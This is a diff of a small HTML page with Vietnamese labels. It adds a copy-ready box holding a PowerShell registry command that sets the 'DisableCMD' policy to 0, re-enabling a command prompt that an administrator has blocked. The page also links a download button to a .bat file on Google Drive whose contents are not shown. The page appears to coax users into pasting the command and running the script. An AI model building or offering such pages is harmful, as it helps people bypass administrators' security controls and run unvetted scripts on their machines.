@@ -24,6 +24,9 @@
       border: 1px solid #333;
       user-select: all;
       margin-bottom: 20px;
+      max-width: 90%;
+      text-align: center;
+      word-wrap: break-word;
     }
 
     .download-btn {
@@ -43,6 +46,7 @@
 </head>
 <body>
   <div class="path-box">C:\Windows\System32\WindowsPowerShell\v1.0\</div>
+  <div class="path-box">Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 0</div>
 
   <a href="https://drive.usercontent.google.com/download?id=1e1CNS-eiHVZeoh9qOYlLAC1-gOJ8cXyc&export=download&authuser=0" download>
     <button class="download-btn">Tải file .bat</button>
